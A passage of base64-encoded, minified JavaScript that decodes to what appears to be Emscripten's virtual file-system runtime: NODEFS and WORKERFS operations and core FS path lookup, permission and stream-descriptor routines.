ZVN5bmMob2xkUGF0aCxuZXdQYXRoKX1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9fSksdW5saW5rOihmdW5jdGlvbihwYXJlbnQsbmFtZSl7dmFyIHBhdGg9UEFUSC5qb2luMihOT0RFRlMucmVhbFBhdGgocGFyZW50KSxuYW1lKTt0cnl7ZnMudW5saW5rU3luYyhwYXRoKX1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9fSkscm1kaXI6KGZ1bmN0aW9uKHBhcmVudCxuYW1lKXt2YXIgcGF0aD1QQVRILmpvaW4yKE5PREVGUy5yZWFsUGF0aChwYXJlbnQpLG5hbWUpO3RyeXtmcy5ybWRpclN5bmMocGF0aCl9Y2F0Y2goZSl7aWYoIWUuY29kZSl0aHJvdyBlO3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pfX0pLHJlYWRkaXI6KGZ1bmN0aW9uKG5vZGUpe3ZhciBwYXRoPU5PREVGUy5yZWFsUGF0aChub2RlKTt0cnl7cmV0dXJuIGZzLnJlYWRkaXJTeW5jKHBhdGgpfWNhdGNoKGUpe2lmKCFlLmNvZGUpdGhyb3cgZTt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX19KSxzeW1saW5rOihmdW5jdGlvbihwYXJlbnQsbmV3TmFtZSxvbGRQYXRoKXt2YXIgbmV3UGF0aD1QQVRILmpvaW4yKE5PREVGUy5yZWFsUGF0aChwYXJlbnQpLG5ld05hbWUpO3RyeXtmcy5zeW1saW5rU3luYyhvbGRQYXRoLG5ld1BhdGgpfWNhdGNoKGUpe2lmKCFlLmNvZGUpdGhyb3cgZTt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX19KSxyZWFkbGluazooZnVuY3Rpb24obm9kZSl7dmFyIHBhdGg9Tk9ERUZTLnJlYWxQYXRoKG5vZGUpO3RyeXtwYXRoPWZzLnJlYWRsaW5rU3luYyhwYXRoKTtwYXRoPU5PREVKU19QQVRILnJlbGF0aXZlKE5PREVKU19QQVRILnJlc29sdmUobm9kZS5tb3VudC5vcHRzLnJvb3QpLHBhdGgpO3JldHVybiBwYXRofWNhdGNoKGUpe2lmKCFlLmNvZGUpdGhyb3cgZTt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX19KX0sc3RyZWFtX29wczp7b3BlbjooZnVuY3Rpb24oc3RyZWFtKXt2YXIgcGF0aD1OT0RFRlMucmVhbFBhdGgoc3RyZWFtLm5vZGUpO3RyeXtpZihGUy5pc0ZpbGUoc3RyZWFtLm5vZGUubW9kZSkpe3N0cmVhbS5uZmQ9ZnMub3BlblN5bmMocGF0aCxOT0RFRlMuZmxhZ3NUb1Blcm1pc3Npb25TdHJpbmcoc3RyZWFtLmZsYWdzKSl9fWNhdGNoKGUpe2lmKCFlLmNvZGUpdGhyb3cgZTt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX19KSxjbG9zZTooZnVuY3Rpb24oc3RyZWFtKXt0cnl7aWYoRlMuaXNGaWxlKHN0cmVhbS5ub2RlLm1vZGUpJiZzdHJlYW0ubmZkKXtmcy5jbG9zZVN5bmMoc3RyZWFtLm5mZCl9fWNhdGNoKGUpe2lmKCFlLmNvZGUpdGhyb3cgZTt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX19KSxyZWFkOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24pe2lmKGxlbmd0aD09PTApcmV0dXJuIDA7dmFyIG5idWZmZXI9bmV3IEJ1ZmZlcihsZW5ndGgpO3ZhciByZXM7dHJ5e3Jlcz1mcy5yZWFkU3luYyhzdHJlYW0ubmZkLG5idWZmZXIsMCxsZW5ndGgscG9zaXRpb24pfWNhdGNoKGUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pfQppZihyZXM+MCl7Zm9yKHZhciBpPTA7aTxyZXM7aSsrKXtidWZmZXJbb2Zmc2V0K2ldPW5idWZmZXJbaV19fQpyZXR1cm4gcmVzfSksd3JpdGU6KGZ1bmN0aW9uKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3NpdGlvbil7dmFyIG5idWZmZXI9bmV3IEJ1ZmZlcihidWZmZXIuc3ViYXJyYXkob2Zmc2V0LG9mZnNldCtsZW5ndGgpKTt2YXIgcmVzO3RyeXtyZXM9ZnMud3JpdGVTeW5jKHN0cmVhbS5uZmQsbmJ1ZmZlciwwLGxlbmd0aCxwb3NpdGlvbil9Y2F0Y2goZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9CnJldHVybiByZXN9KSxsbHNlZWs6KGZ1bmN0aW9uKHN0cmVhbSxvZmZzZXQsd2hlbmNlKXt2YXIgcG9zaXRpb249b2Zmc2V0O2lmKHdoZW5jZT09PTEpe3Bvc2l0aW9uKz1zdHJlYW0ucG9zaXRpb259ZWxzZSBpZih3aGVuY2U9PT0yKXtpZihGUy5pc0ZpbGUoc3RyZWFtLm5vZGUubW9kZSkpe3RyeXt2YXIgc3RhdD1mcy5mc3RhdFN5bmMoc3RyZWFtLm5mZCk7cG9zaXRpb24rPXN0YXQuc2l6ZX1jYXRjaChlKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX19fQppZihwb3NpdGlvbjwwKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfQpyZXR1cm4gcG9zaXRpb259KX19O3ZhciBXT1JLRVJGUz17RElSX01PREU6MTY4OTUsRklMRV9NT0RFOjMzMjc5LHJlYWRlcjpudWxsLG1vdW50OihmdW5jdGlvbihtb3VudCl7YXNzZXJ0KEVOVklST05NRU5UX0lTX1dPUktFUik7aWYoIVdPUktFUkZTLnJlYWRlcilXT1JLRVJGUy5yZWFkZXI9bmV3IEZpbGVSZWFkZXJTeW5jO3ZhciByb290PVdPUktFUkZTLmNyZWF0ZU5vZGUobnVsbCwiLyIsV09SS0VSRlMuRElSX01PREUsMCk7dmFyIGNyZWF0ZWRQYXJlbnRzPXt9O2Z1bmN0aW9uIGVuc3VyZVBhcmVudChwYXRoKXt2YXIgcGFydHM9cGF0aC5zcGxpdCgiLyIpO3ZhciBwYXJlbnQ9cm9vdDtmb3IodmFyIGk9MDtpPHBhcnRzLmxlbmd0aC0xO2krKyl7dmFyIGN1cnI9cGFydHMuc2xpY2UoMCxpKzEpLmpvaW4oIi8iKTtpZighY3JlYXRlZFBhcmVudHNbY3Vycl0pe2NyZWF0ZWRQYXJlbnRzW2N1cnJdPVdPUktFUkZTLmNyZWF0ZU5vZGUocGFyZW50LHBhcnRzW2ldLFdPUktFUkZTLkRJUl9NT0RFLDApfQpwYXJlbnQ9Y3JlYXRlZFBhcmVudHNbY3Vycl19CnJldHVybiBwYXJlbnR9CmZ1bmN0aW9uIGJhc2UocGF0aCl7dmFyIHBhcnRzPXBhdGguc3BsaXQoIi8iKTtyZXR1cm4gcGFydHNbcGFydHMubGVuZ3RoLTFdfQpBcnJheS5wcm90b3R5cGUuZm9yRWFjaC5jYWxsKG1vdW50Lm9wdHMuZmlsZXN8fFtdLChmdW5jdGlvbihmaWxlKXtXT1JLRVJGUy5jcmVhdGVOb2RlKGVuc3VyZVBhcmVudChmaWxlLm5hbWUpLGJhc2UoZmlsZS5uYW1lKSxXT1JLRVJGUy5GSUxFX01PREUsMCxmaWxlLGZpbGUubGFzdE1vZGlmaWVkRGF0ZSl9KSk7KG1vdW50Lm9wdHMuYmxvYnN8fFtdKS5mb3JFYWNoKChmdW5jdGlvbihvYmope1dPUktFUkZTLmNyZWF0ZU5vZGUoZW5zdXJlUGFyZW50KG9iai5uYW1lKSxiYXNlKG9iai5uYW1lKSxXT1JLRVJGUy5GSUxFX01PREUsMCxvYmouZGF0YSl9KSk7KG1vdW50Lm9wdHMucGFja2FnZXN8fFtdKS5mb3JFYWNoKChmdW5jdGlvbihwYWNrKXtwYWNrLm1ldGFkYXRhLmZpbGVzLmZvckVhY2goKGZ1bmN0aW9uKGZpbGUpe3ZhciBuYW1lPWZpbGUuZmlsZW5hbWUuc3Vic3RyKDEpO1dPUktFUkZTLmNyZWF0ZU5vZGUoZW5zdXJlUGFyZW50KG5hbWUpLGJhc2UobmFtZSksV09SS0VSRlMuRklMRV9NT0RFLDAscGFjay5ibG9iLnNsaWNlKGZpbGUuc3RhcnQsZmlsZS5lbmQpKX0pKX0pKTtyZXR1cm4gcm9vdH0pLGNyZWF0ZU5vZGU6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLG1vZGUsZGV2LGNvbnRlbnRzLG10aW1lKXt2YXIgbm9kZT1GUy5jcmVhdGVOb2RlKHBhcmVudCxuYW1lLG1vZGUpO25vZGUubW9kZT1tb2RlO25vZGUubm9kZV9vcHM9V09SS0VSRlMubm9kZV9vcHM7bm9kZS5zdHJlYW1fb3BzPVdPUktFUkZTLnN0cmVhbV9vcHM7bm9kZS50aW1lc3RhbXA9KG10aW1lfHxuZXcgRGF0ZSkuZ2V0VGltZSgpO2Fzc2VydChXT1JLRVJGUy5GSUxFX01PREUhPT1XT1JLRVJGUy5ESVJfTU9ERSk7aWYobW9kZT09PVdPUktFUkZTLkZJTEVfTU9ERSl7bm9kZS5zaXplPWNvbnRlbnRzLnNpemU7bm9kZS5jb250ZW50cz1jb250ZW50c31lbHNle25vZGUuc2l6ZT00MDk2O25vZGUuY29udGVudHM9e319CmlmKHBhcmVudCl7cGFyZW50LmNvbnRlbnRzW25hbWVdPW5vZGV9CnJldHVybiBub2RlfSksbm9kZV9vcHM6e2dldGF0dHI6KGZ1bmN0aW9uKG5vZGUpe3JldHVybntkZXY6MSxpbm86dW5kZWZpbmVkLG1vZGU6bm9kZS5tb2RlLG5saW5rOjEsdWlkOjAsZ2lkOjAscmRldjp1bmRlZmluZWQsc2l6ZTpub2RlLnNpemUsYXRpbWU6bmV3IERhdGUobm9kZS50aW1lc3RhbXApLG10aW1lOm5ldyBEYXRlKG5vZGUudGltZXN0YW1wKSxjdGltZTpuZXcgRGF0ZShub2RlLnRpbWVzdGFtcCksYmxrc2l6ZTo0MDk2LGJsb2NrczpNYXRoLmNlaWwobm9kZS5zaXplLzQwOTYpfX0pLHNldGF0dHI6KGZ1bmN0aW9uKG5vZGUsYXR0cil7aWYoYXR0ci5tb2RlIT09dW5kZWZpbmVkKXtub2RlLm1vZGU9YXR0ci5tb2RlfQppZihhdHRyLnRpbWVzdGFtcCE9PXVuZGVmaW5lZCl7bm9kZS50aW1lc3RhbXA9YXR0ci50aW1lc3RhbXB9fSksbG9va3VwOihmdW5jdGlvbihwYXJlbnQsbmFtZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKX0pLG1rbm9kOihmdW5jdGlvbihwYXJlbnQsbmFtZSxtb2RlLGRldil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfSkscmVuYW1lOihmdW5jdGlvbihvbGROb2RlLG5ld0RpcixuZXdOYW1lKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9KSx1bmxpbms6KGZ1bmN0aW9uKHBhcmVudCxuYW1lKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9KSxybWRpcjooZnVuY3Rpb24ocGFyZW50LG5hbWUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKX0pLHJlYWRkaXI6KGZ1bmN0aW9uKG5vZGUpe3ZhciBlbnRyaWVzPVsiLiIsIi4uIl07Zm9yKHZhciBrZXkgaW4gbm9kZS5jb250ZW50cyl7aWYoIW5vZGUuY29udGVudHMuaGFzT3duUHJvcGVydHkoa2V5KSl7Y29udGludWV9CmVudHJpZXMucHVzaChrZXkpfQpyZXR1cm4gZW50cmllc30pLHN5bWxpbms6KGZ1bmN0aW9uKHBhcmVudCxuZXdOYW1lLG9sZFBhdGgpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKX0pLHJlYWRsaW5rOihmdW5jdGlvbihub2RlKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9KX0sc3RyZWFtX29wczp7cmVhZDooZnVuY3Rpb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLHBvc2l0aW9uKXtpZihwb3NpdGlvbj49c3RyZWFtLm5vZGUuc2l6ZSlyZXR1cm4gMDt2YXIgY2h1bms9c3RyZWFtLm5vZGUuY29udGVudHMuc2xpY2UocG9zaXRpb24scG9zaXRpb24rbGVuZ3RoKTt2YXIgYWI9V09SS0VSRlMucmVhZGVyLnJlYWRBc0FycmF5QnVmZmVyKGNodW5rKTtidWZmZXIuc2V0KG5ldyBVaW50OEFycmF5KGFiKSxvZmZzZXQpO3JldHVybiBjaHVuay5zaXplfSksd3JpdGU6KGZ1bmN0aW9uKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3NpdGlvbil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlPKX0pLGxsc2VlazooZnVuY3Rpb24oc3RyZWFtLG9mZnNldCx3aGVuY2Upe3ZhciBwb3NpdGlvbj1vZmZzZXQ7aWYod2hlbmNlPT09MSl7cG9zaXRpb24rPXN0cmVhbS5wb3NpdGlvbn1lbHNlIGlmKHdoZW5jZT09PTIpe2lmKEZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSl7cG9zaXRpb24rPXN0cmVhbS5ub2RlLnNpemV9fQppZihwb3NpdGlvbjwwKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfQpyZXR1cm4gcG9zaXRpb259KX19O1NUQVRJQ1RPUCs9MTY7U1RBVElDVE9QKz0xNjtTVEFUSUNUT1ArPTE2O3ZhciBGUz17cm9vdDpudWxsLG1vdW50czpbXSxkZXZpY2VzOltudWxsXSxzdHJlYW1zOltdLG5leHRJbm9kZToxLG5hbWVUYWJsZTpudWxsLGN1cnJlbnRQYXRoOiIvIixpbml0aWFsaXplZDohMSxpZ25vcmVQZXJtaXNzaW9uczohMCx0cmFja2luZ0RlbGVnYXRlOnt9LHRyYWNraW5nOntvcGVuRmxhZ3M6e1JFQUQ6MSxXUklURToyfX0sRXJybm9FcnJvcjpudWxsLGdlbmVyaWNFcnJvcnM6e30sZmlsZXN5c3RlbXM6bnVsbCxzeW5jRlNSZXF1ZXN0czowLGhhbmRsZUZTRXJyb3I6KGZ1bmN0aW9uKGUpe2lmKCEoZSBpbnN0YW5jZW9mIEZTLkVycm5vRXJyb3IpKXRocm93IGUrIiA6ICIrc3RhY2tUcmFjZSgpO3JldHVybiBfX19zZXRFcnJObyhlLmVycm5vKX0pLGxvb2t1cFBhdGg6KGZ1bmN0aW9uKHBhdGgsb3B0cyl7cGF0aD1QQVRILnJlc29sdmUoRlMuY3dkKCkscGF0aCk7b3B0cz1vcHRzfHx7fTtpZighcGF0aClyZXR1cm57cGF0aDoiIixub2RlOm51bGx9O3ZhciBkZWZhdWx0cz17Zm9sbG93X21vdW50OiEwLHJlY3Vyc2VfY291bnQ6MH07Zm9yKHZhciBrZXkgaW4gZGVmYXVsdHMpe2lmKG9wdHNba2V5XT09PXVuZGVmaW5lZCl7b3B0c1trZXldPWRlZmF1bHRzW2tleV19fQppZihvcHRzLnJlY3Vyc2VfY291bnQ+OCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUxPT1ApfQp2YXIgcGFydHM9UEFUSC5ub3JtYWxpemVBcnJheShwYXRoLnNwbGl0KCIvIikuZmlsdGVyKChmdW5jdGlvbihwKXtyZXR1cm4hIXB9KSksITEpO3ZhciBjdXJyZW50PUZTLnJvb3Q7dmFyIGN1cnJlbnRfcGF0aD0iLyI7Zm9yKHZhciBpPTA7aTxwYXJ0cy5sZW5ndGg7aSsrKXt2YXIgaXNsYXN0PWk9PT1wYXJ0cy5sZW5ndGgtMTtpZihpc2xhc3QmJm9wdHMucGFyZW50KXticmVha30KY3VycmVudD1GUy5sb29rdXBOb2RlKGN1cnJlbnQscGFydHNbaV0pO2N1cnJlbnRfcGF0aD1QQVRILmpvaW4yKGN1cnJlbnRfcGF0aCxwYXJ0c1tpXSk7aWYoRlMuaXNNb3VudHBvaW50KGN1cnJlbnQpKXtpZighaXNsYXN0fHxpc2xhc3QmJm9wdHMuZm9sbG93X21vdW50KXtjdXJyZW50PWN1cnJlbnQubW91bnRlZC5yb290fX0KaWYoIWlzbGFzdHx8b3B0cy5mb2xsb3cpe3ZhciBjb3VudD0wO3doaWxlKEZTLmlzTGluayhjdXJyZW50Lm1vZGUpKXt2YXIgbGluaz1GUy5yZWFkbGluayhjdXJyZW50X3BhdGgpO2N1cnJlbnRfcGF0aD1QQVRILnJlc29sdmUoUEFUSC5kaXJuYW1lKGN1cnJlbnRfcGF0aCksbGluayk7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKGN1cnJlbnRfcGF0aCx7cmVjdXJzZV9jb3VudDpvcHRzLnJlY3Vyc2VfY291bnR9KTtjdXJyZW50PWxvb2t1cC5ub2RlO2lmKGNvdW50Kys+NDApe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVMT09QKX19fX0KcmV0dXJue3BhdGg6Y3VycmVudF9wYXRoLG5vZGU6Y3VycmVudH19KSxnZXRQYXRoOihmdW5jdGlvbihub2RlKXt2YXIgcGF0aDt3aGlsZSghMCl7aWYoRlMuaXNSb290KG5vZGUpKXt2YXIgbW91bnQ9bm9kZS5tb3VudC5tb3VudHBvaW50O2lmKCFwYXRoKXJldHVybiBtb3VudDtyZXR1cm4gbW91bnRbbW91bnQubGVuZ3RoLTFdIT09Ii8iP21vdW50KyIvIitwYXRoOm1vdW50K3BhdGh9CnBhdGg9cGF0aD9ub2RlLm5hbWUrIi8iK3BhdGg6bm9kZS5uYW1lO25vZGU9bm9kZS5wYXJlbnR9fSksaGFzaE5hbWU6KGZ1bmN0aW9uKHBhcmVudGlkLG5hbWUpe3ZhciBoYXNoPTA7Zm9yKHZhciBpPTA7aTxuYW1lLmxlbmd0aDtpKyspe2hhc2g9KGhhc2g8PDUpLWhhc2grbmFtZS5jaGFyQ29kZUF0KGkpfDB9CnJldHVybihwYXJlbnRpZCtoYXNoPj4+MCklRlMubmFtZVRhYmxlLmxlbmd0aH0pLGhhc2hBZGROb2RlOihmdW5jdGlvbihub2RlKXt2YXIgaGFzaD1GUy5oYXNoTmFtZShub2RlLnBhcmVudC5pZCxub2RlLm5hbWUpO25vZGUubmFtZV9uZXh0PUZTLm5hbWVUYWJsZVtoYXNoXTtGUy5uYW1lVGFibGVbaGFzaF09bm9kZX0pLGhhc2hSZW1vdmVOb2RlOihmdW5jdGlvbihub2RlKXt2YXIgaGFzaD1GUy5oYXNoTmFtZShub2RlLnBhcmVudC5pZCxub2RlLm5hbWUpO2lmKEZTLm5hbWVUYWJsZVtoYXNoXT09PW5vZGUpe0ZTLm5hbWVUYWJsZVtoYXNoXT1ub2RlLm5hbWVfbmV4dH1lbHNle3ZhciBjdXJyZW50PUZTLm5hbWVUYWJsZVtoYXNoXTt3aGlsZShjdXJyZW50KXtpZihjdXJyZW50Lm5hbWVfbmV4dD09PW5vZGUpe2N1cnJlbnQubmFtZV9uZXh0PW5vZGUubmFtZV9uZXh0O2JyZWFrfQpjdXJyZW50PWN1cnJlbnQubmFtZV9uZXh0fX19KSxsb29rdXBOb2RlOihmdW5jdGlvbihwYXJlbnQsbmFtZSl7dmFyIGVycj1GUy5tYXlMb29rdXAocGFyZW50KTtpZihlcnIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycixwYXJlbnQpfQp2YXIgaGFzaD1GUy5oYXNoTmFtZShwYXJlbnQuaWQsbmFtZSk7Zm9yKHZhciBub2RlPUZTLm5hbWVUYWJsZVtoYXNoXTtub2RlO25vZGU9bm9kZS5uYW1lX25leHQpe3ZhciBub2RlTmFtZT1ub2RlLm5hbWU7aWYobm9kZS5wYXJlbnQuaWQ9PT1wYXJlbnQuaWQmJm5vZGVOYW1lPT09bmFtZSl7cmV0dXJuIG5vZGV9fQpyZXR1cm4gRlMubG9va3VwKHBhcmVudCxuYW1lKX0pLGNyZWF0ZU5vZGU6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLG1vZGUscmRldil7aWYoIUZTLkZTTm9kZSl7RlMuRlNOb2RlPShmdW5jdGlvbihwYXJlbnQsbmFtZSxtb2RlLHJkZXYpe2lmKCFwYXJlbnQpe3BhcmVudD10aGlzfQp0aGlzLnBhcmVudD1wYXJlbnQ7dGhpcy5tb3VudD1wYXJlbnQubW91bnQ7dGhpcy5tb3VudGVkPW51bGw7dGhpcy5pZD1GUy5uZXh0SW5vZGUrKzt0aGlzLm5hbWU9bmFtZTt0aGlzLm1vZGU9bW9kZTt0aGlzLm5vZGVfb3BzPXt9O3RoaXMuc3RyZWFtX29wcz17fTt0aGlzLnJkZXY9cmRldn0pO0ZTLkZTTm9kZS5wcm90b3R5cGU9e307dmFyIHJlYWRNb2RlPTI5Mnw3Mzt2YXIgd3JpdGVNb2RlPTE0NjtPYmplY3QuZGVmaW5lUHJvcGVydGllcyhGUy5GU05vZGUucHJvdG90eXBlLHtyZWFkOntnZXQ6KGZ1bmN0aW9uKCl7cmV0dXJuKHRoaXMubW9kZSZyZWFkTW9kZSk9PT1yZWFkTW9kZX0pLHNldDooZnVuY3Rpb24odmFsKXt2YWw/dGhpcy5tb2RlfD1yZWFkTW9kZTp0aGlzLm1vZGUmPX5yZWFkTW9kZX0pfSx3cml0ZTp7Z2V0OihmdW5jdGlvbigpe3JldHVybih0aGlzLm1vZGUmd3JpdGVNb2RlKT09PXdyaXRlTW9kZX0pLHNldDooZnVuY3Rpb24odmFsKXt2YWw/dGhpcy5tb2RlfD13cml0ZU1vZGU6dGhpcy5tb2RlJj1+d3JpdGVNb2RlfSl9LGlzRm9sZGVyOntnZXQ6KGZ1bmN0aW9uKCl7cmV0dXJuIEZTLmlzRGlyKHRoaXMubW9kZSl9KX0saXNEZXZpY2U6e2dldDooZnVuY3Rpb24oKXtyZXR1cm4gRlMuaXNDaHJkZXYodGhpcy5tb2RlKX0pfX0pfQp2YXIgbm9kZT1uZXcgRlMuRlNOb2RlKHBhcmVudCxuYW1lLG1vZGUscmRldik7RlMuaGFzaEFkZE5vZGUobm9kZSk7cmV0dXJuIG5vZGV9KSxkZXN0cm95Tm9kZTooZnVuY3Rpb24obm9kZSl7RlMuaGFzaFJlbW92ZU5vZGUobm9kZSl9KSxpc1Jvb3Q6KGZ1bmN0aW9uKG5vZGUpe3JldHVybiBub2RlPT09bm9kZS5wYXJlbnR9KSxpc01vdW50cG9pbnQ6KGZ1bmN0aW9uKG5vZGUpe3JldHVybiEhbm9kZS5tb3VudGVkfSksaXNGaWxlOihmdW5jdGlvbihtb2RlKXtyZXR1cm4obW9kZSY2MTQ0MCk9PT0zMjc2OH0pLGlzRGlyOihmdW5jdGlvbihtb2RlKXtyZXR1cm4obW9kZSY2MTQ0MCk9PT0xNjM4NH0pLGlzTGluazooZnVuY3Rpb24obW9kZSl7cmV0dXJuKG1vZGUmNjE0NDApPT09NDA5NjB9KSxpc0NocmRldjooZnVuY3Rpb24obW9kZSl7cmV0dXJuKG1vZGUmNjE0NDApPT09ODE5Mn0pLGlzQmxrZGV2OihmdW5jdGlvbihtb2RlKXtyZXR1cm4obW9kZSY2MTQ0MCk9PT0yNDU3Nn0pLGlzRklGTzooZnVuY3Rpb24obW9kZSl7cmV0dXJuKG1vZGUmNjE0NDApPT09NDA5Nn0pLGlzU29ja2V0OihmdW5jdGlvbihtb2RlKXtyZXR1cm4obW9kZSY0OTE1Mik9PT00OTE1Mn0pLGZsYWdNb2Rlczp7InIiOjAsInJzIjoxMDUyNjcyLCJyKyI6MiwidyI6NTc3LCJ3eCI6NzA1LCJ4dyI6NzA1LCJ3KyI6NTc4LCJ3eCsiOjcwNiwieHcrIjo3MDYsImEiOjEwODksImF4IjoxMjE3LCJ4YSI6MTIxNywiYSsiOjEwOTAsImF4KyI6MTIxOCwieGErIjoxMjE4fSxtb2RlU3RyaW5nVG9GbGFnczooZnVuY3Rpb24oc3RyKXt2YXIgZmxhZ3M9RlMuZmxhZ01vZGVzW3N0cl07aWYodHlwZW9mIGZsYWdzPT09InVuZGVmaW5lZCIpe3Rocm93IG5ldyBFcnJvcigiVW5rbm93biBmaWxlIG9wZW4gbW9kZTogIitzdHIpfQpyZXR1cm4gZmxhZ3N9KSxmbGFnc1RvUGVybWlzc2lvblN0cmluZzooZnVuY3Rpb24oZmxhZyl7dmFyIHBlcm1zPVsiciIsInciLCJydyJdW2ZsYWcmM107aWYoZmxhZyY1MTIpe3Blcm1zKz0idyJ9CnJldHVybiBwZXJtc30pLG5vZGVQZXJtaXNzaW9uczooZnVuY3Rpb24obm9kZSxwZXJtcyl7aWYoRlMuaWdub3JlUGVybWlzc2lvbnMpe3JldHVybiAwfQppZihwZXJtcy5pbmRleE9mKCJyIikhPT0tMSYmIShub2RlLm1vZGUmMjkyKSl7cmV0dXJuIEVSUk5PX0NPREVTLkVBQ0NFU31lbHNlIGlmKHBlcm1zLmluZGV4T2YoInciKSE9PS0xJiYhKG5vZGUubW9kZSYxNDYpKXtyZXR1cm4gRVJSTk9fQ09ERVMuRUFDQ0VTfWVsc2UgaWYocGVybXMuaW5kZXhPZigieCIpIT09LTEmJiEobm9kZS5tb2RlJjczKSl7cmV0dXJuIEVSUk5PX0NPREVTLkVBQ0NFU30KcmV0dXJuIDB9KSxtYXlMb29rdXA6KGZ1bmN0aW9uKGRpcil7dmFyIGVycj1GUy5ub2RlUGVybWlzc2lvbnMoZGlyLCJ4Iik7aWYoZXJyKXJldHVybiBlcnI7aWYoIWRpci5ub2RlX29wcy5sb29rdXApcmV0dXJuIEVSUk5PX0NPREVTLkVBQ0NFUztyZXR1cm4gMH0pLG1heUNyZWF0ZTooZnVuY3Rpb24oZGlyLG5hbWUpe3RyeXt2YXIgbm9kZT1GUy5sb29rdXBOb2RlKGRpcixuYW1lKTtyZXR1cm4gRVJSTk9fQ09ERVMuRUVYSVNUfWNhdGNoKGUpe30KcmV0dXJuIEZTLm5vZGVQZXJtaXNzaW9ucyhkaXIsInd4Iil9KSxtYXlEZWxldGU6KGZ1bmN0aW9uKGRpcixuYW1lLGlzZGlyKXt2YXIgbm9kZTt0cnl7bm9kZT1GUy5sb29rdXBOb2RlKGRpcixuYW1lKX1jYXRjaChlKXtyZXR1cm4gZS5lcnJub30KdmFyIGVycj1GUy5ub2RlUGVybWlzc2lvbnMoZGlyLCJ3eCIpO2lmKGVycil7cmV0dXJuIGVycn0KaWYoaXNkaXIpe2lmKCFGUy5pc0Rpcihub2RlLm1vZGUpKXtyZXR1cm4gRVJSTk9fQ09ERVMuRU5PVERJUn0KaWYoRlMuaXNSb290KG5vZGUpfHxGUy5nZXRQYXRoKG5vZGUpPT09RlMuY3dkKCkpe3JldHVybiBFUlJOT19DT0RFUy5FQlVTWX19ZWxzZXtpZihGUy5pc0Rpcihub2RlLm1vZGUpKXtyZXR1cm4gRVJSTk9fQ09ERVMuRUlTRElSfX0KcmV0dXJuIDB9KSxtYXlPcGVuOihmdW5jdGlvbihub2RlLGZsYWdzKXtpZighbm9kZSl7cmV0dXJuIEVSUk5PX0NPREVTLkVOT0VOVH0KaWYoRlMuaXNMaW5rKG5vZGUubW9kZSkpe3JldHVybiBFUlJOT19DT0RFUy5FTE9PUH1lbHNlIGlmKEZTLmlzRGlyKG5vZGUubW9kZSkpe2lmKEZTLmZsYWdzVG9QZXJtaXNzaW9uU3RyaW5nKGZsYWdzKSE9PSJyInx8ZmxhZ3MmNTEyKXtyZXR1cm4gRVJSTk9fQ09ERVMuRUlTRElSfX0KcmV0dXJuIEZTLm5vZGVQZXJtaXNzaW9ucyhub2RlLEZTLmZsYWdzVG9QZXJtaXNzaW9uU3RyaW5nKGZsYWdzKSl9KSxNQVhfT1BFTl9GRFM6NDA5NixuZXh0ZmQ6KGZ1bmN0aW9uKGZkX3N0YXJ0LGZkX2VuZCl7ZmRfc3RhcnQ9ZmRfc3RhcnR8fDA7ZmRfZW5kPWZkX2VuZHx8RlMuTUFYX09QRU5fRkRTO2Zvcih2YXIgZmQ9ZmRfc3RhcnQ7ZmQ8PWZkX2VuZDtmZCsrKXtpZighRlMuc3RyZWFtc1tmZF0pe3JldHVybiBmZH19CnRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVNRklMRSl9KSxnZXRTdHJlYW06KGZ1bmN0aW9uKGZkKXtyZXR1cm4gRlMuc3RyZWFtc1tmZF19KSxjcmVhdGVTdHJlYW06KGZ1bmN0aW9uKHN0c